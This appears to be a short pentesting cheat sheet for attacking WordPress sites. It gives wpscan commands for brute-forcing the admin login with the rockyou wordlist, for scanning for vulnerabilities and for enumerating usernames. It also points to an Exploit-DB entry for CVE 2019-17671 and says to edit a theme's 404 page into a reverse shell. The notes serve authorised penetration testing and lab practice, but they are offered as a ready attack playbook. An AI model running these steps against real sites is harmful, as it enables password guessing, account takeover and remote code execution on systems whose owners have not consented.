## Hacking wordpress sites

## Bruteforce login
wpscan --url http://IP/blog/wp-login.php --passwords rockyou.txt --usernames admin --max-threads 60 

## Multiple vulnerability scan types
wpscan --url IP -e 

## Enumerate usernames
wpscan --url https://target.tld/ --enumerate u

# CVE 2019-17671
[Exploit-DB writeup](https://www.exploit-db.com/exploits/47690)

# Reverse shell
Edit the wordpress theme's 404 page and set it to become a reverse shell.
